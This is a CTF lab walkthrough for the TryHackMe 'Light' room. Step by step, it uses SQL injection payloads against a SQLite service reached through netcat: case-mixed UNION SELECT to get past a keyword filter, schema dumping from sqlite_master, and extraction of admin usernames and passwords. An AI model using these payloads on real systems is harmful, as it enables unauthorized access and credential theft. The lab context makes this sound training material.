# Light THM CTF Walkthrough

![Image](https://github.com/user-attachments/assets/5290634e-2fc4-4f83-92d2-a67e8a10efde) <br/>
Solving DAV TryHackMe Capture The Flag [Light TryHackMe Room](https://tryhackme.com/room/lightroom)

## Connect to the Database

rlwrap is used for better use of shell rather than base netcat listener.

```sh
rlwrap nc <URL> 1337
```

![Image](https://github.com/user-attachments/assets/9e04c1e0-c05e-4b3b-b940-a7f1ee0c5c13) <br/>

---

Passing ' to check for SQL Injection Vulnerability.

```sh
'
```

![Image](https://github.com/user-attachments/assets/fa1c9260-ad8b-4418-a7e8-8b84c3fe4585) <br/>

This site is injectable.

---

Attempting union injection.

```sh
' union
```

![Image](https://github.com/user-attachments/assets/d9f23ab2-f940-4633-96a5-97f09ac3c5ac) <br/>

It seems union and select terms are prohibited.

---

Playing with sentence case.

```sh
' UnION
```

![Image](https://github.com/user-attachments/assets/007872c6-637a-4d60-a0cb-386812ead888)

It Worked!

---

Trying union select 1 with the new command.

```sh
' UnION SeleCT 1 '
```

![Image](https://github.com/user-attachments/assets/f8d41a32-7514-482c-b776-f092c63b23b1) <br/>

---

Trying to find out sql version.

```sh
' UnION SeleCT version() '
```

![Image](https://github.com/user-attachments/assets/bae8cc21-7715-413b-8d33-97309c186303)

---

Let's try with sqlite_version since CTF name was "Light"

```sh
' UnION SeleCT sqlite_version() '
```

![Image](https://github.com/user-attachments/assets/f9395315-ffa7-47ba-94cb-65a7d4397506)

It Works

---

```sh
' UnION SeleCT group_concat(sql) from sqlite_master'
```

![Image](https://github.com/user-attachments/assets/25348212-c85d-41f7-8a8c-7d13c35f9c37)

---

```sh
' UnION SeleCT group_concat(username) from admintable '
```

```sh
' UnION SeleCT group_concat(password) from admintable '
```

![Image](https://github.com/user-attachments/assets/86f46714-7c41-4c0a-86bb-a67c2ef5126c) <br/>

---

